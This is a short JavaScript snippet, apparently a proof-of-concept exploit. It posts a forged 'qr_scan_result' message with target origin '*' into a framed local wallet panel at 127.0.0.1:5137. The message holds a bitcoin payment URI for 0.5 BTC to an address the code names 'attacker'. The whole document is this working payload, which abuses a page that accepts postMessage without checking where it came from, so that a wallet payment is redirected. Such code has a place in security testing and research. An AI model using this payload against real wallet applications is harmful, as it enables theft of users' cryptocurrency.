(function () {
  var f = document.getElementById('p3f');
  var attacker = '1BitcoinEaterAddressDontSendf59kuE';
  f.contentWindow.postMessage({
    type: 'qr_scan_result',
    data: [{ type: 'bip21', value: 'bitcoin:' + attacker + '?amount=0.5' }]
  }, '*');   // cross-origin post is permitted for SENDING
  return JSON.stringify({ posted: true, to: 'framed 127.0.0.1:5137/wallet-panel' });
})()
